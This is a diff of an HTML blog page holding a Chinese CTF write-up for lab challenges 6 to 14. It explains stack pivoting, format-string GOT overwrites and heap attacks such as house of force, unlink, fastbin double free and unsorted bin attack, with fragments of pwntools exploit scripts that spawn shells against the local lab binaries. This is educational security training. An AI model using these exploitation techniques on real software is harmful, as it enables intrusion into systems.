 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab6</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -1181,22 +1189,18 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>稍微解释一下，先通过主函数中可以控制的 20个 字节将 esp 指针劫持到可控的 bss 段，然后就可以可以在 bss 段为所欲为了。</p>
-
+</div><p>稍微解释一下，先通过主函数中可以控制的 20个 字节将 esp 指针劫持到可控的 bss 段，然后就可以可以在 bss 段为所欲为了。</p>
 <p>关于 stack-pivot，pwnable.kr 的 simple_login 是很经典的题目，放上一篇这道题的很不错的 <a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049"><strong>wp</strong></a></p>
-
 <p>这个还有个问题，sendline 会 gg，send 就可以，在 atum 大佬的 <a href="http://atum.li/2016/09/20/ctf-strange/"><strong>博客</strong></a> 上找到了原因
 另外不建议把迁移后的栈放在 bss 段开头, 因为 stdout, stdin, stderr 等结构体往往存储在这里, 破坏这些结构体很可能会引起输入输出的错误</p>
-
 <h3 id="lab7-crack">lab7-crack</h3>
-
 <p>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(&ldquo;cat flag&rdquo;) 处（注意这里 printf 实际调用了 puts）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1251,7 +1255,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab7</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">hijack</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -1268,7 +1272,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 <span class="n">lab7</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">overwrite</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -1285,7 +1289,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 <span class="n">lab7</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">leak</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -1301,19 +1305,16 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked</span><span class="p">))</span>
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>32位的 binary 可以直接使用 pwntools 封装好的<strong>fmtstr_payload</strong>函数：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq2zoc31gjj30om0p3jv2.jpg" alt="" /></p>
-
+</div><p>32位的 binary 可以直接使用 pwntools 封装好的<strong>fmtstr_payload</strong>函数：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq2zoc31gjj30om0p3jv2.jpg" alt=""></p>
 <h3 id="lab8-craxme">lab8-craxme</h3>
-
 <p>同样是32位的 fsb，直接用 fmtstr_payload 就可以解决</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1336,7 +1337,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab8</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -1354,17 +1355,15 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./craxme&#34;</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>如果想要自己实现 fmtstr_payload 功能，可以参考这篇 <a href="https://paper.seebug.org/246/"><strong>文章</strong></a></p>
-
+</div><p>如果想要自己实现 fmtstr_payload 功能，可以参考这篇 <a href="https://paper.seebug.org/246/"><strong>文章</strong></a></p>
 <h3 id="lab9-playfmt">lab9-playfmt</h3>
-
 <p>和上一道题相比, lab9 的格式化字符串不在栈上,在全局变量 (.bss) 段, 因此我们就不能直接控制栈上的变量来进行修改 got 等行为,但可以通过控制</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1394,7 +1393,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">Breakpoint *do_fmt+64
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Breakpoint *do_fmt+64
 pwndbg&gt; stack 25
 00:0000│ esp  0xffffd0c0 —▸ 0x804a060 (buf) ◂— 0xa7025 /* &#39;%p\n&#39; */
 01:0004│      0xffffd0c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
@@ -1421,26 +1420,24 @@ pwndbg&gt; stack 25
 16:0058│      0xffffd118 —▸ 0xffffd1ac —▸ 0xffffd375 ◂— 0x5f474458 (&#39;XDG_&#39;)
 17:005c│      0xffffd11c ◂— 0x0
 ... ↓
-pwndbg&gt; </code></pre></td></tr></table>
+pwndbg&gt; 
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>如上 0x15, 0x16, 0x06 出的指针指向栈上的变量, 如修改 0x15 处为</p>
+</div><p>如上 0x15, 0x16, 0x06 出的指针指向栈上的变量, 如修改 0x15 处为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)</code></pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>然后再将 0x8048584 修改为某个 got 地址, 就可以实现间接地写 got 了, 这种方式也基本成了一种固定的套路, 如 hackme.inndy 的 <a href="https://github.com/0x01f/pwn_repo/tree/master/inndy_echo3">echo3</a> 一道题</p>
-
+</div><p>然后再将 0x8048584 修改为某个 got 地址, 就可以实现间接地写 got 了, 这种方式也基本成了一种固定的套路, 如 hackme.inndy 的 <a href="https://github.com/0x01f/pwn_repo/tree/master/inndy_echo3">echo3</a> 一道题</p>
 <h4 id="exp">exp</h4>
-
 <p>为了解释清楚整个利用的过程, 我把我调试时的信息也放到脚本里了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -1963,21 +1960,18 @@ pwndbg&gt; </code></pre></td></tr></table>
 <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;44444444&#34;</span><span class="p">,</span> <span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>可以通过设置标记变量(如我 exp 中的 11111111, 22222222 等)进行输入输出的定位</p>
 </blockquote>
-
 <h3 id="lab10-hacknote">lab10-hacknote</h3>
-
 <p>最简单的一种 fastbin uaf 利用，结构体中有函数指针，通过 uaf 控制该函数指针指向 magic 函数即可，uaf 的介绍可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf"><strong>slide</strong></a></p>
-
 <p>exp:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2028,7 +2022,7 @@ pwndbg&gt; </code></pre></td></tr></table>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab10</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -2074,49 +2068,38 @@ pwndbg&gt; </code></pre></td></tr></table>
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
     <span class="n">uaf</span><span class="p">()</span>
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>说一下怎么修复 IDA 中的结构体</p>
-
 <p>识别出结构体的具体结构后</p>
-
 <ul>
-<li>shift+F1, insert 插入识别出的结果</li>
+<li>
+<p>shift+F1, insert 插入识别出的结果</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30oi6hn6j30qt0hgjsc.jpg" alt=""></p>
+</li>
+<li>
+<p>shift+F9, insert 导入我们刚添加的 local type</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30podbi2j31490m8jwq.jpg" alt=""></p>
+</li>
+<li>
+<p>然后我们在结构体变量上 y 一下，制定其数据类型即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30qp97hyj30nn06zt9k.jpg" alt=""></p>
+</li>
+<li>
+<p>修复的效果图如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30rb5bzyj30gd03lmxn.jpg" alt=""></p>
+</li>
 </ul>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30oi6hn6j30qt0hgjsc.jpg" alt="" /></p>
-
-<ul>
-<li>shift+F9, insert 导入我们刚添加的 local type</li>
-</ul>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30podbi2j31490m8jwq.jpg" alt="" /></p>
-
-<ul>
-<li>然后我们在结构体变量上 y 一下，制定其数据类型即可</li>
-</ul>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30qp97hyj30nn06zt9k.jpg" alt="" /></p>
-
-<ul>
-<li>修复的效果图如下：</li>
-</ul>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30rb5bzyj30gd03lmxn.jpg" alt="" /></p>
 </blockquote>
-
 <h3 id="lab11-bamboobox">lab11-bamboobox</h3>
-
 <p>可以种 house of force，也可以使用 unsafe unlink，先说 house of force 的方法</p>
-
 <h4 id="house-of-force">house of force</h4>
-
 <p>简单说一下我对 hof 的理解，如果我们能控制 <strong>top_chunk</strong> 的 <strong>size</strong>，那么我们就可以通过控制 malloc 一些精心设计的<strong>大数/负数</strong>来实现控制 top_chunk 的指针，就可以实现任意地址写的效果，个人感觉，hof 的核心思想就在这个 force 上，疯狂 malloc，简单粗暴效果明显</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2162,7 +2145,7 @@ pwndbg&gt; </code></pre></td></tr></table>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab11</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">hof</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -2203,19 +2186,17 @@ pwndbg&gt; </code></pre></td></tr></table>
     <span class="nb">exit</span><span class="p">()</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>快速确定需要 malloc 的大数/负数可以使用 Pwngdb 的 force 功能, 这里我做了一个 <a href="https://github.com/0x01f/Pwngdb">fork</a>, 把 Pwngdb 和 pwndbg 的功能做了一个合并</p>
 </blockquote>
-
 <h4 id="unlink">unlink</h4>
-
 <p>至于 unlink，在这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf">slide</a> 中有较大篇幅的介绍，就不在说明原理了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2285,7 +2266,7 @@ pwndbg&gt; </code></pre></td></tr></table>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab11</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">unlink</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -2350,17 +2331,15 @@ pwndbg&gt; </code></pre></td></tr></table>
     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;$0&#39;</span><span class="p">)</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出，通过 house of house 直接控制函数指针进而控制 ip 的方法代码量少了不少，这也提醒我们不要放弃利用任何一个函数指针的机会</p>
-
+</div><p>可以看出，通过 house of house 直接控制函数指针进而控制 ip 的方法代码量少了不少，这也提醒我们不要放弃利用任何一个函数指针的机会</p>
 <h3 id="lab12-secretgarden">lab12-secretgarden</h3>
-
 <p>通过 double free 实现 fastbin attack 的题目，所谓 double free，指的就是对同一个 allocated chunk free 两次，这样就可以形成一个类似 <strong>0  -&gt; 1 -&gt; 0</strong> 的 cycled fastbin list，这样当我们 malloc 出 0 时，就可以修改 fastbin list 中 0 的 fd，如 <strong>1 -&gt; 0 -&gt; target</strong>，这样只要我们再 malloc 三次，并通过 malloc 的检查，就可以实现 malloc 到任何地址，进而实现任意地址写，至于 double free 的检查怎么绕过可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2408,6 +2387,7 @@ pwndbg&gt; </code></pre></td></tr></table>
 </span><span class="lnt">46
 </span><span class="lnt">47
 </span><span class="lnt">48
+</span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
@@ -2457,23 +2437,21 @@ pwndbg&gt; </code></pre></td></tr></table>
     <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+</code></pre></td></tr></table>
 </div>
-</div>
-<ul>
+</div><ul>
 <li>以上的 exp 实现了通过 fastbin attack 来修改 got, 实际上通过 fastbin attack 来修改 __malloc_hook, __realloc_hook, __free_hook, IO_file_plus 结构体中的 jump_table 也是很常见的做法, 尤其是程序开了 Full Relro 保护时</li>
 <li>pwnable.tw 的 Secret Garden 一题就用到了以上几种做法, 可以参考这篇 <a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/">writeup</a></li>
-<li>参考了 <a href="https://veritas501.space/2018/03/27/调教pwndbg/">veritas501</a> 师傅的文章, 我在我的 <a href="https://github.com/0x01f/Pwngdb">fork</a> 里也加入了快速利用 fastbin attack 的函数 fake_fastbin_all</li>
+<li>参考了 <a href="https://veritas501.space/2018/03/27/%E8%B0%83%E6%95%99pwndbg/">veritas501</a> 师傅的文章, 我在我的 <a href="https://github.com/0x01f/Pwngdb">fork</a> 里也加入了快速利用 fastbin attack 的函数 fake_fastbin_all</li>
 </ul>
-
 <h3 id="lab13-heapcreator">lab13-heapcreator</h3>
-
 <p>在 edit_heap 中有一个故意留下来的 off-by-one，并且不是 off-by-one null byte，因此我们就可以有很大自由度地控制下一个 chunk 的 size, 可以使用 extended chunk 这种技巧造成 overlapping chunk，进而通过将 *content 覆写为某函数的 got (如 free/atoi) 就可以 leak 出 libc 的地址，然后再改写为 system 的地址，控制参数即可 get shell</p>
-
 <p>关于 extended chunk 的介绍可以看这个 <strong><a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2527,7 +2505,7 @@ pwndbg&gt; </code></pre></td></tr></table>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab13</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -2576,19 +2554,18 @@ pwndbg&gt; </code></pre></td></tr></table>
 
     <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="lab14-magicheap">lab14-magicheap</h3>
-
+</div><h3 id="lab14-magicheap">lab14-magicheap</h3>
 <p>在 edit_heap() 里有 arbitrary overflow, 我们最终要达到的目的是修改全局变量 magic &gt; 4869, 可以考虑使用 unsorted bin attack 这一技巧
 unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsorted bin list 的地址), 看起来比较局限, 但在某些情境下还是很有用的:</p>
-
 <ul>
-<li><p>修改 global_max_fast 为一个较大的数, 这样根据 malloc 的源码</p>
+<li>修改 global_max_fast 为一个较大的数, 这样根据 malloc 的源码</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2602,44 +2579,45 @@ unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsor
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
-</span><span class="cm">If the size qualifies as a fastbin, first check corresponding bin.
-</span><span class="cm">This code is safe to execute even if av is not yet initialized, so we
-</span><span class="cm">can try it without checking, which saves some time on this fast path.
+</span><span class="cm">   If the size qualifies as a fastbin, first check corresponding bin.
+</span><span class="cm">   This code is safe to execute even if av is not yet initialized, so we
+</span><span class="cm">   can try it without checking, which saves some time on this fast path.
 </span><span class="cm">*/</span>
 <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
-<span class="p">{</span>
-<span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
-<span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
-<span class="n">mchunkptr</span> <span class="n">pp</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>
-<span class="p">.....</span></code></pre></td></tr></table>
+ <span class="p">{</span>
+   <span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+   <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+   <span class="n">mchunkptr</span> <span class="n">pp</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>
+    <span class="p">.....</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>更大的 chunk 也可以被视为 fastbin, fastbin attack 的利用范围就大了很多</p></li>
-
-<li><p>往某一地址上写值, 比如可以在 __free_hook 前的某一地址上写入一个大数(0x7f**********)来满足 fastbin attack 的条件(提供 fastbin 的 size)</p></li>
+</div><p>更大的 chunk 也可以被视为 fastbin, fastbin attack 的利用范围就大了很多</p>
+<ul>
+<li>往某一地址上写值, 比如可以在 __free_hook 前的某一地址上写入一个大数(0x7f**********)来满足 fastbin attack 的条件(提供 fastbin 的 size)</li>
 </ul>
-
 <p>unsorted bin attack 的原理也很简单, unsorted bin 的自己实现了 unlink 的功能, 没有使用宏定义</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
+</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C">          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
           <span class="p">......</span>
           <span class="cm">/* remove from unsorted list */</span>
           <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
-          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span></code></pre></td></tr></table>
+          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出, 如果我们能控制 unsorted bin 的bk 为地址 target - 16, 那么在 bck -&gt; fd = unsorted_chunks(av) 这一步时, target 就会被写入 unsorted bin 的地址. 但同时也要注意此时 unsorted bin list 已经被破坏, 下次再有 unsorted bin 的操作就会引起 crash</p>
+</div><p>可以看出, 如果我们能控制 unsorted bin 的bk 为地址 target - 16, 那么在 bck -&gt; fd = unsorted_chunks(av) 这一步时, target 就会被写入 unsorted bin 的地址. 但同时也要注意此时 unsorted bin list 已经被破坏, 下次再有 unsorted bin 的操作就会引起 crash</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
